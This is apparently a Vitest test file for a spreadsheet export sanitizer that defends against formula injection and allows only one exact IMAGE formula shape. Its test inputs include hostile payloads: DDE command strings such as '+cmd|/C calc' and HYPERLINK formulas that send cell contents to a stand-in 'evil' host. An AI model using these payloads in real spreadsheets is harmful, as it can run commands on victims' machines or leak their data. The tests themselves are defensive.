import { describe, expect, it } from 'vitest';
import { sanitizeSheetCell, sanitizeSheetRow } from '../sheets/sanitize.js';
import { emptyDomainRecord, recordToRow } from '../sheets/serialize.js';

describe('sanitizeSheetCell', () => {
  it('prefixes formula triggers with an apostrophe', () => {
    expect(sanitizeSheetCell('=SUM(A1:A9)')).toBe("'=SUM(A1:A9)");
    expect(sanitizeSheetCell('=HYPERLINK("http://evil","x")')).toBe(
      '\'=HYPERLINK("http://evil","x")',
    );
    expect(sanitizeSheetCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(sanitizeSheetCell('+cmd|/C calc')).toBe("'+cmd|/C calc");
    expect(sanitizeSheetCell('-2+3+cmd|/C calc')).toBe("'-2+3+cmd|/C calc");
    expect(sanitizeSheetCell('\t=1+1')).toBe("'\t=1+1");
    expect(sanitizeSheetCell('\r=1+1')).toBe("'\r=1+1");
    expect(sanitizeSheetCell('\n=1+1')).toBe("'\n=1+1");
  });

  it('leaves plain text, empty strings, and non-strings alone', () => {
    expect(sanitizeSheetCell('example.com')).toBe('example.com');
    expect(sanitizeSheetCell('')).toBe('');
    expect(sanitizeSheetCell(42)).toBe(42);
    expect(sanitizeSheetCell(null)).toBe(null);
    expect(sanitizeSheetCell(undefined)).toBe(undefined);
  });

  it('leaves bare signed numbers alone (inert, keeps numeric sorting)', () => {
    expect(sanitizeSheetCell('-12')).toBe('-12');
    expect(sanitizeSheetCell('-3.5')).toBe('-3.5');
    expect(sanitizeSheetCell('+7')).toBe('+7');
    // ...but a sign followed by anything non-numeric is neutralized
    expect(sanitizeSheetCell('-12x')).toBe("'-12x");
    expect(sanitizeSheetCell('-1-1')).toBe("'-1-1");
  });

  it('blocks =IMAGE() unless explicitly allowed', () => {
    const formula = '=IMAGE("https://cdn.example.com/shots/a.png", 4, 60, 100)';
    expect(sanitizeSheetCell(formula)).toBe(`'${formula}`);
    expect(sanitizeSheetCell(formula, { allowImageFormula: true })).toBe(formula);
  });

  it('rejects spoofed IMAGE formulas even when the flag is set', () => {
    const spoofs = [
      '=IMAGE("https://x.com/a.png")+HYPERLINK("http://evil")',
      '=IMAGE(A1)',
      '=IMAGE("javascript:alert(1)")',
      '=IMAGE("https://x.com/a.png", 4, 60, 100) + 1',
      '=IMAGEX("https://x.com/a.png")',
    ];
    for (const s of spoofs) {
      expect(sanitizeSheetCell(s, { allowImageFormula: true })).toBe(`'${s}`);
    }
  });

  it('accepts the exact formula shape the monitor emits', () => {
    // Mirrors monitor/src/output/mapResult.ts buildImageFormula()
    const monitorFormula = '=IMAGE("https://user.github.io/storage/thumbs/example.com.jpg", 4, 60, 100)';
    expect(sanitizeSheetCell(monitorFormula, { allowImageFormula: true })).toBe(monitorFormula);
  });
});

describe('sanitizeSheetRow', () => {
  it('sanitizes every cell, honoring the image column exemption', () => {
    const row = ['=evil()', 'ok', '=IMAGE("https://x.com/a.png")'];
    expect(sanitizeSheetRow(row, 2)).toEqual(["'=evil()", 'ok', '=IMAGE("https://x.com/a.png")']);
    // Without the exemption index, the IMAGE formula is neutralized too
    expect(sanitizeSheetRow(row)).toEqual(["'=evil()", 'ok', '\'=IMAGE("https://x.com/a.png")']);
  });
});

describe('recordToRow sanitization (C-4 integration)', () => {
  it('neutralizes injected formulas in user-controlled fields', () => {
    const rec = emptyDomainRecord();
    rec.company = '=HYPERLINK("http://evil/?"&A1,"click")';
    rec.notes = '@SUM(1+9)';
    rec.metaTitle = '+cmd|/C calc';
    const row = recordToRow(rec);
    expect(row[0]).toBe('\'=HYPERLINK("http://evil/?"&A1,"click")');
    expect(row[43]).toBe("'@SUM(1+9)");
    expect(row[27]).toBe("'+cmd|/C calc");
  });

  it('preserves the imageFormula column and negative day counts', () => {
    const rec = emptyDomainRecord();
    rec.imageFormula = '=IMAGE("https://cdn.example.com/t.jpg", 4, 60, 100)';
    rec.sslDaysRemaining = '-14';
    const row = recordToRow(rec);
    expect(row[36]).toBe('=IMAGE("https://cdn.example.com/t.jpg", 4, 60, 100)');
    expect(row[13]).toBe('-14');
  });
});
